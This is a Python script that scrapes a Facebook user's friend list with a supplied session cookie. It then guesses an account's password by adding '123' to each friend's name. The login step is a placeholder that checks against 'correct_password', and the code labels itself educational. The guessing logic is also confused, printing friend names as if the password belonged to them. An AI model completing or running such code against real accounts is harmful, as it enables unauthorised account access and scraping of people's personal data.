import requests
from bs4 import BeautifulSoup

class FacebookFriendScraper:
    def __init__(self, datr_cookie, owner_name):
        self.datr_cookie = datr_cookie
        self.owner_name = owner_name
        self.session = requests.Session()
        self.session.cookies['datr'] = datr_cookie

    def scrape_friend_list(self, user_uid_or_email):
        friendlist_url = f'https://www.facebook.com/{user_uid_or_email}/friends'
        response = self.session.get(friendlist_url)

        if 'Friends' in response.text:
            soup = BeautifulSoup(response.text, 'html.parser')
            friend_names = [name.text for name in soup.find_all(class_='fsl fwb fcb')]
            return friend_names
        else:
            return []

    def attempt_passwords(self, friend_names):
        for name in friend_names:
            potential_password = name + '123'
            if self.attempt_login(self.owner_name, potential_password):
                print(f"Password for {name}: {potential_password}")

    def attempt_login(self, username, password):
        # Implement the login attempt logic here
        # For educational purposes, this is a simple placeholder
        # In a real scenario, you'd interact with the login page
        return password == 'correct_password'

if __name__ == '__main__':
    datr_cookie = input("Enter your 'datr' cookie value: ")
    owner_name = "Bishesh"  # Your name or owner name

    scraper = FacebookFriendScraper(datr_cookie, owner_name)
    
    user_uid_or_email = input("Enter the user's UID or user email: ")
    
    friend_names = scraper.scrape_friend_list(user_uid_or_email)
    
    if friend_names:
        print("Friend names retrieved successfully.")
        scraper.attempt_passwords(friend_names)
    else:
        print("Failed to retrieve the friend list.")
